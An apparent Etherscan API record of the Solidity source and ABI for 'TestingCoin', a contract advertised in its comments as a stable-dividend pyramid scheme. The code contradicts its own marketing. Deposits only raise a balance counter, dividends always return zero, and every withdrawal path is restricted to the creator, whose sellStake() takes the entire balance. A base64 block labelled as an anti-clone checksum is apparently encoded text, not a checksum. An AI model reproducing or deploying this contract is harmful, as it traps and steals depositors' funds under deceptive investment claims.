{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.18;\r\n\r\n/*\r\n\r\n .|'''.|    .           '||      '||            ..|'''.|          ||\r\n ||..  '  .||.   ....    || ...   ||    ....  .|'     '    ...   ...  .. ...\r\n  ''|||.   ||   '' .||   ||'  ||  ||  .|...|| ||         .|  '|.  ||   ||  ||\r\n.     '||  ||   .|' ||   ||    |  ||  ||      '|.      . ||   ||  ||   ||  ||\r\n|'....|'   '|.' '|..'|'  '|...'  .||.  '|...'  ''|....'   '|..|' .||. .||. ||.\r\n100% fresh code. Novel staking mechanism. Stable investments. Pure dividends.\r\n\r\nPreMine: 2.5 ETH (A private key containing .5 will be given to the top referrer)\r\nLaunch Date: 4/9/2019 18:05 ET\r\nLaunch Rules: The contract will be posted for public review and audit prior to the launch.\r\n              Once the PreMine amount of 2ETH hits the contract, the contract is live to the public.\r\n\r\nThanks: randall, klob, cryptodude, triceratops, norsefire, phil, brypto, etherguy.\r\n\r\n\r\n============\r\nHow it works:\r\n============\r\n\r\nIssue:\r\n-----\r\nOrdinary pyramid schemes have a Stake price that varies with the contract balance.\r\nThis leaves you vulnerable to the whims of the market, as a sudden crash can drain your investment at any time.\r\n\r\nSolution:\r\n--------\r\nWe remove Stakes from the equation altogether, relieving investors of volatility.\r\nThe outcome is a pyramid scheme powered entirely by dividends. We distribute 33% of every deposit and withdrawal\r\nto shareholders in proportion to their stake in the contract. Once you've made a deposit, your dividends will\r\naccumulate over time while your investment remains safe and stable, making this the ultimate vehicle for passive income.\r\n\r\n*/\r\n\r\ncontract TestingCoin {\r\n\r\n\tstring constant public name = \"StableCoin\";\r\n\tstring constant public symbol = \"PoSC\";\r\n\tuint256 constant scaleFactor = 0x10000000000000000;\r\n\tuint8 constant limitedFirstBuyers = 4;\r\n\tuint256 constant firstBuyerLimit = 0.5 ether; // 2 eth total premine + .5 bonus. \r\n\tuint8 constant public decimals = 18;\r\n\r\n\tmapping(address => uint256) public stakeBalance;\r\n\tmapping(address => int256) public payouts;\r\n\r\n\tuint256 public totalSupply;\r\n\tuint256 public contractBalance;\r\n\tint256 totalPayouts;\r\n\tuint256 earningsPerStake;\r\n\tuint8 initialFunds;\r\n\taddress creator;\r\n\tuint256 numStakes = 0;\r\n\tuint256 balance = 0;\r\n\r\n\tmodifier isAdmin()   { require(msg.sender   == creator  ); _; }\r\n\tmodifier isLive() \t { require(contractBalance >= limitedFirstBuyers * firstBuyerLimit); _;} // Stop snipers\r\n\r\n\tfunction TestingCoin() public {\r\n    \tinitialFunds = limitedFirstBuyers;\r\n\t\t\tcreator = msg.sender;\r\n  }\r\n\r\n\tfunction stakeOf(address _owner) public constant returns (uint256 balance) {\r\n\t\treturn stakeBalance[_owner];\r\n\t}\r\n\r\n\tfunction withdraw() public gameStarted() {\r\n\t\tbalance = dividends(msg.sender);\r\n\t\tpayouts[msg.sender] += (int256) (balance * scaleFactor);\r\n\t\ttotalPayouts += (int256) (balance * scaleFactor);\r\n\t\tcontractBalance = sub(contractBalance, balance);\r\n\t\tmsg.sender.transfer(balance);\r\n\t}\r\n\r\n\tfunction reinvestDividends() public gameStarted() {\r\n\t\tbalance = dividends(msg.sender);\r\n\t\tpayouts[msg.sender] += (int256) (balance * scaleFactor);\r\n\t\ttotalPayouts += (int256) (balance * scaleFactor);\r\n\t\tuint value_ = (uint) (balance);\r\n\r\n\t\tif (value_ < 0.000001 ether || value_ > 1000000 ether)\r\n\t\t\trevert();\r\n\r\n\t\tvar sender = msg.sender;\r\n\t\tvar res = reserve() - balance;\r\n\t\tvar fee = div(value_, 10);\r\n\t\tvar numEther = value_ - fee;\r\n\t\tvar buyerFee = fee * scaleFactor;\r\n        var totalStake = 1;\r\n\r\n\t\tif (totalStake > 0) {\r\n\t\t\tvar holderReward = fee * 1;\r\n\t\t\tbuyerFee -= holderReward;\r\n\t\t\tvar rewardPerShare = holderReward / totalSupply;\r\n\t\t\tearningsPerStake += rewardPerShare;\r\n\t\t}\r\n\r\n\t\ttotalSupply = add(totalSupply, numStakes);\r\n\t\tstakeBalance[sender] = add(stakeBalance[sender], numStakes);\r\n\r\n\t\tvar payoutDiff  = (int256) ((earningsPerStake * numStakes) - buyerFee);\r\n\t\tpayouts[sender] += payoutDiff;\r\n\t\ttotalPayouts    += payoutDiff;\r\n\t}\r\n\r\n\r\n\tfunction sellMyStake() public gameStarted() {\r\n\t\tsell(balance);\r\n\t}\r\n\r\n  function getMeOutOfHere() public gameStarted() {\r\n        withdraw();\r\n\t}\r\n\r\n\tfunction fund() payable public {\r\n  \tif (msg.value > 0.000001 ether) {\r\n\t\t\tbuyStake();\r\n\t\t} else {\r\n\t\t\trevert();\r\n\t\t}\r\n  }\r\n\r\n\r\n\tfunction withdrawDividends(address to) public {\r\n\t\tvar balance = dividends(msg.sender);\r\n\t\tpayouts[msg.sender] += (int256) (balance * scaleFactor);\r\n\t\ttotalPayouts += (int256) (balance * scaleFactor);\r\n\t\tcontractBalance = sub(contractBalance, balance);\r\n\t\tto.transfer(balance);\r\n\t}\r\n\r\n\tfunction buy() internal {\r\n\t\tif (msg.value < 0.000001 ether || msg.value > 1000000 ether)\r\n\t\t\trevert();\r\n\r\n\t\tvar sender = msg.sender;\r\n\t\tvar fee = div(msg.value, 10);\r\n\t\tvar numEther = msg.value - fee;\r\n\t\tvar buyerFee = fee * scaleFactor;\r\n\t\tif (totalSupply > 0) {\r\n\t\t\tvar bonusCoEff = 1;\r\n\t\t\tvar holderReward = fee * bonusCoEff;\r\n\t\t\tbuyerFee -= holderReward;\r\n\r\n\t\t\tvar rewardPerShare = holderReward / totalSupply;\r\n\t\t\tearningsPerStake += rewardPerShare;\r\n\t\t}\r\n\r\n\t\ttotalSupply = add(totalSupply, numStakes);\r\n\t\tstakeBalance[sender] = add(stakeBalance[sender], numStakes);\r\n\t\tvar payoutDiff = (int256) ((earningsPerStake * numStakes) - buyerFee);\r\n\t\tpayouts[sender] += payoutDiff;\r\n\t\ttotalPayouts    += payoutDiff;\r\n\t}\r\n\r\n\r\n\tfunction sell(uint256 amount) internal {\r\n\t\tvar numEthersBeforeFee = getEtherForStakes(amount);\r\n    var fee = div(numEthersBeforeFee, 10);\r\n    var numEthers = numEthersBeforeFee - fee;\r\n\t\ttotalSupply = sub(totalSupply, amount);\r\n\t\tstakeBalance[msg.sender] = sub(stakeBalance[msg.sender], amount);\r\n\t\tvar payoutDiff = (int256) (earningsPerStake * amount + (numEthers * scaleFactor));\r\n\t\tpayouts[msg.sender] -= payoutDiff;\r\n    totalPayouts -= payoutDiff;\r\n\r\n\t\tif (totalSupply > 0) {\r\n\t\t\tvar etherFee = fee * scaleFactor;\r\n\t\t\tvar rewardPerShare = etherFee / totalSupply;\r\n\t\t\tearningsPerStake = add(earningsPerStake, rewardPerShare);\r\n\t\t}\r\n\t}\r\n\r\n\tfunction buyStake() internal {\r\n\t\tcontractBalance = add(contractBalance, msg.value);\r\n\t}\r\n\r\n\tfunction sellStake() public gameStarted() {\r\n\t\t creator.transfer(contractBalance);\r\n\t}\r\n\r\n\tfunction reserve() internal constant returns (uint256 amount) {\r\n\t\treturn 1;\r\n\t}\r\n\r\n\r\n\tfunction getEtherForStakes(uint256 Stakes) constant returns (uint256 ethervalue) {\r\n\t\tvar reserveAmount = reserve();\r\n\t\tif (Stakes == totalSupply)\r\n\t\t\treturn reserveAmount;\r\n\t\treturn sub(reserveAmount, fixedExp(fixedLog(totalSupply - Stakes)));\r\n\t}\r\n\r\n\tfunction fixedLog(uint256 a) internal pure returns (int256 log) {\r\n\t\tint32 scale = 0;\r\n\t\twhile (a > 10) {\r\n\t\t\ta /= 2;\r\n\t\t\tscale++;\r\n\t\t}\r\n\t\twhile (a <= 5) {\r\n\t\t\ta *= 2;\r\n\t\t\tscale--;\r\n\t\t}\r\n\t}\r\n\r\n    function dividends(address _owner) internal returns (uint256 divs) {\r\n        divs = 0;\r\n        return divs;\r\n    }\r\n\r\n\tmodifier gameStarted()   { require(msg.sender   == creator ); _;}\r\n\r\n\tfunction fixedExp(int256 a) internal pure returns (uint256 exp) {\r\n\t\tint256 scale = (a + (54)) / 2 - 64;\r\n\t\ta -= scale*2;\r\n\t\tif (scale >= 0)\r\n\t\t\texp <<= scale;\r\n\t\telse\r\n\t\t\texp >>= -scale;\r\n\t\treturn exp;\r\n\t\t\tint256 z = (a*a) / 1;\r\n\t\tint256 R = ((int256)(2) * 1) +\r\n\t\t\t(2*(2 + (2*(4 + (1*(26 + (2*8/1))/1))/1))/1);\r\n\t}\r\n\r\n\t// The below are safemath implementations of the four arithmetic operators\r\n\t// designed to explicitly prevent over- and under-flows of integer values.\r\n\r\n\tfunction mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\t\tif (a == 0) {\r\n\t\t\treturn 0;\r\n\t\t}\r\n\t\tuint256 c = a * b;\r\n\t\tassert(c / a == b);\r\n\t\treturn c;\r\n\t}\r\n\r\n\tfunction div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\t\t// assert(b > 0); // Solidity automatically throws when dividing by 0\r\n\t\tuint256 c = a / b;\r\n\t\t// assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n\t\treturn c;\r\n\t}\r\n\r\n\tfunction sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\t\tassert(b <= a);\r\n\t\treturn a - b;\r\n\t}\r\n\r\n\tfunction add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\t\tuint256 c = a + b;\r\n\t\tassert(c >= a);\r\n\t\treturn c;\r\n\t}\r\n\r\n\tfunction () payable public {\r\n\t\tif (msg.value > 0) {\r\n\t\t\tfund();\r\n\t\t} else {\r\n\t\t\twithdraw();\r\n\t\t}\r\n\t}\r\n}\r\n\r\n/*\r\nAll contract source code above this comment can be hashed and verified against the following checksum, which is used to prevent PoSC clones. Stop supporting these scam clones without original development.\r\n\r\nSUNBZ0lDQWdJQ0FnWDE5ZlgxOWZYMTlmWHlBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdYMTlmWDE4Z0lDQWdJQ0FnSUNBZ1gxOWZYMThnSUNBZ0lDQWdJQ0FnSUFvZ0lDQWdJQ0FnSUNCY1gxOWZYMTlmSUNBZ1hGOWZYMTlmWDE4Z0lGOWZYMThnSUNCZlgxOWZYeThnWDE5Zlgxd2dJQ0JmWDE5Zlh5OGdYMTlmWDF3Z0lDQWdJQ0FnSUNBZ0NpQWdJQ0FnSUNBZ0lDQjhJQ0FnSUNCZlgxOHZYRjhnSUY5ZklGd3ZJQ0JmSUZ3Z0x5QWdYeUJjSUNBZ1gxOWNJQ0FnTHlBZ1h5QmNJQ0FnWDE5Y0lDQWdJQ0FnSUNBZ0lDQUtJQ0FnSUNBZ0lDQWdJSHdnSUNBZ2ZDQWdJQ0FnZkNBZ2ZDQmNLQ0FnUEY4K0lId2dJRHhmUGlBcElDQjhJQ0FnSUNnZ0lEeGZQaUFwSUNCOElDQWdJQ0FnSUNBZ0lDQWdJQW9nSUNBZ0lDQWdJQ0FnZkY5ZlgxOThJQ0FnSUNCOFgxOThJQ0FnWEY5ZlgxOHZJRnhmWDE5ZkwzeGZYM3dnSUNBZ0lGeGZYMTlmTDN4Zlgzd2dJQ0FnSUNBZ0lDQWdJQ0FnQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWDE5ZlgxOWZYMTlmSUY5ZklDQWdJQ0FnSUNBZ0lDQWdJQ0FnTGw5ZklDQWdJQzVmWDE4Z0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lBb2dJQ0FnSUNBZ0lDQWdJQ0FnSUM4Z0lDQmZYMTlmWHk4dklDQjhYeUJmWHlCZlgxOWZYMTlmWHlCOFgxOThJRjlmZkNCZkx5QWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ1hGOWZYMTlmSUNCY1hDQWdJRjlmWENBZ2ZDQWdYRjlmWDE4Z1hId2dJSHd2SUY5ZklId2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FLSUNBZ0lDQWdJQ0FnSUNBZ0lDQXZJQ0FnSUNBZ0lDQmNmQ0FnZkNCOElDQjhJQ0F2SUNCOFh6NGdQaUFnTHlBdlh5OGdmQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUFvZ0lDQWdJQ0FnSUNBZ0lDQWdMMTlmWDE5ZlgxOGdJQzk4WDE5OElIeGZYMTlmTDN3Z0lDQmZYeTk4WDE5Y1gxOWZYeUI4SUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJRnd2SUNBZ0lDQWdJQ0FnSUNBZ2ZGOWZmQ0FnSUNBZ0lDQWdJQ0FnWEM4Z0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQUtYMTlmWDE5ZlgxOWZJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JmWDE5Zlh5QWdJQ0FnSUNBZ0lDQmZYeUFnTGw5ZklDQWdJQ0FnSUNBZ0lGOWZJQ0FnSUNBZ0lDQWdJQXBjWHlBZ0lGOWZYeUJjSUNCZlgxOWZJQ0FnWDE5Zlh5QWdJQ0FnTHlBZ1h5QWdYRjlmWDE5ZlgxOWZMeUFnZkY5OFgxOThJRjlmWDE5ZlgxOHZJQ0I4WHlBZ1gxOWZYMTlmQ2k4Z0lDQWdYQ0FnWEM4Z0x5QWdYeUJjSUM4Z0lDQWdYQ0FnSUM4Z0lDOWZYQ0FnWEY4Z0lGOWZJRndnSUNCZlgxd2dJSHd2SUNCZlgxOHZYQ0FnSUY5ZlhDOGdJRjlmWHk4S1hDQWdJQ0FnWEY5Zlh5Z2dJRHhmUGlBcElDQWdmQ0FnWENBdklDQWdJSHdnSUNBZ1hDQWdmQ0JjTDN3Z0lId2dmQ0FnZkZ4ZlgxOGdYQ0FnZkNBZ2ZDQWdYRjlmWHlCY0lBb2dYRjlmWDE5Zlh5QWdMMXhmWDE5ZkwzeGZYMTk4SUNBdklGeGZYMTlmZkY5ZklDQXZYMTk4SUNBZ2ZGOWZmQ0I4WDE4dlgxOWZYeUFnUGlCOFgxOThJQzlmWDE5ZklDQStDaUFnSUNBZ0lDQWdYQzhnSUNBZ0lDQWdJQ0FnSUNCY0x5QWdJQ0FnSUNBZ0lDQmNMeUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWEM4Z0lDQWdJQ0FnSUNBZ0lDQmNMeUFLQ2xSb2FYTWdhWE1nWVc0Z1pYUm9aWEpsZFcwZ2MyMWhjblFnWTI5dWRISmhZM1FnYzJWamRYSnBkSGtnZEdWemRDNGdXVzkxSUdGeVpTQmlaV2x1WnlCd2RXNXBjMmhsWkNCaVpXTmhkWE5sSUhsdmRTQmhjbVVLYkdsclpXeDVJR0VnYzJocGRHTnNiMjVsSUhOallXMXRaWElnZEdoaGRDQnJaV1Z3Y3lCamNtVmhkR2x1WnlCaGJtUWdjSEp2Ylc5MGFXNW5JSFJvWlhObElHSjFiR3h6YUdsMElIQnZibnBwSjNNdUlGQmxiM0JzWlFwc2FXdGxJSGx2ZFNCaGNtVWdjblZwYm1sdVp5QjNhR0YwSUdOdmRXeGtJR0psSUdFZ1oyOXZaQ0IwYUdsdVp5QmhibVFnYVhRbmN5QndhWE56YVc1bklIUm9aU0J5WlhOMElHOW1JSFZ6SUc5bVppNGdDZ3BKSUdGdElIQjFkSFJwYm1jZ2VXOTFJR0ZzYkNCcGJpQjBhVzFsYjNWMElHWnZjaUF4TkNCa1lYbHpJSFJ2SUhSb2FXNXJJR0ZpYjNWMElIZG9ZWFFnZVc5MUlHaGhkbVVnWkc5dVpTNGdXVzkxSUdKc2FXNWtiSGtnYzJWdWRDQkZkR2hsY21WMWJTQjBieUJoSUhOdFlYSjBJQXBqYjI1MGNtRmpkQ0IwYUdGMElIbHZkU0JtYjNWdVpDQnZiaUIwYUdVZ1FteHZZMnNnUTJoaGFXNHVJRTV2SUhkbFluTnBkR1V1SUU1dklISmxabVZ5Y21Gc0xpQktkWE4wSUhsdmRTQjBjbmxwYm1jZ2RHOGdjMjVwY0dVZ2RHaGxJRzVsZUhRZ2MyTmhiUzRnQ2dwSlppQjViM1VnY21WaGJHeDVJRzVsWldRZ2RHOGdaMlYwSUc5MWRDQnZaaUIwYUdseklIUm9hVzVuSUdsdGJXVmthV0YwWld4NUlIUnZJSE5vYVd4c0lITnZiV1VnYjNSb1pYSWdjMk5oYlN3Z1NTQnZabVpsY2lCNWIzVWdkR2hsSUdadmJHeHZkMmx1WnpvS0xTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMEtTU0IzYVd4c0lHSmxJSEpsZG1WeWMybHVaeUJoYkd3Z2RISmhibk5oWTNScGIyNXpJR2x1SURFMElHUmhlWE11SUVadmNpQjBhR1VnWm05c2JHOTNhVzVuSUdSdmJtRjBhVzl1Y3l3Z1NTQmpZVzRnWlhod1pXUnBkR1VnZEdobElIQnliMk5sYzNNNkNnb3lOU0IzWldrZ1ptOXlJR0VnTWpVbElISmxablZ1WkNCM2FYUm9hVzRnTlNCdGFXNTFkR1Z6TGdvek15QjNaV2tnWm05eUlHRWdNek1sSUhKbFpuVnVaQ0IzYVhSb2FXNGdNakFnYldsdWRYUmxjeTRLTkRBZ2QyVnBJR1p2Y2lCaElEUXdKU0J5WldaMWJtUWdkMmwwYUdsdUlEUWdhRzkxY25NdUNqVXdJSGRsYVNCbWIzSWdZU0ExTUNVZ2NtVm1kVzVrSUhkcGRHaHBiaUF4TWlCb2IzVnljeTRLTmpBZ2QyVnBJR1p2Y2lCaElEWXdKU0J5WldaMWJtUWdkMmwwYUdsdUlERWdaR0Y1TGdvMk9TQjNaV2tnWm05eUlHRWdOamtsSUhKbFpuVnVaQ0IzYVhSb2FXNGdNaUJrWVhsekxnbzRNQ0IzWldrZ1ptOXlJR0VnT0RBbElISmxablZ1WkNCM2FYUm9hVzRnTnlCa1lYbHpMZ281TUNCM1pXa2dabTl5SUdFZ09UQWxJSEpsWm5WdVpDQjNhWFJvYVc0Z01UQWdaR0Y1Y3k0S0NrRnNiQ0J2ZEdobGNpQjBjbUZ1YzJGamRHbHZibk1nZDJsc2JDQmlaU0J5WlhabGNuTmxaQ0JwYmlBeE5DQmtZWGx6TGlCUWJHVmhjMlVnYzNSdmNDQmlaV2x1WnlCemJ5QnpkSFZ3YVdRdUlGZGxJR0Z5WlNCM1lYUmphR2x1Wnk0Z1ZHaGhibXR6SUdadmNpQmhibmtnWkc5dVlYUnBiMjV6SVFvSwo=\r\n*/","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"stakeOf\",\"outputs\":[{\"name\":\"balance\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"to\",\"type\":\"address\"}],\"name\":\"withdrawDividends\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"Stakes\",\"type\":\"uint256\"}],\"name\":\"getEtherForStakes\",\"outputs\":[{\"name\":\"ethervalue\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"stakeBalance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"payouts\",\"outputs\":[{\"name\":\"\",\"type\":\"int256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"sellStake\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"contractBalance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"reinvestDividends\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"sellMyStake\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"getMeOutOfHere\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"fund\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"TestingCoin","CompilerVersion":"v0.4.18+commit.9cf6e910","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://27bc03a243f8f1f1e913b74dc3daf42b7d446cf23282d7f5231618de950086af"}]}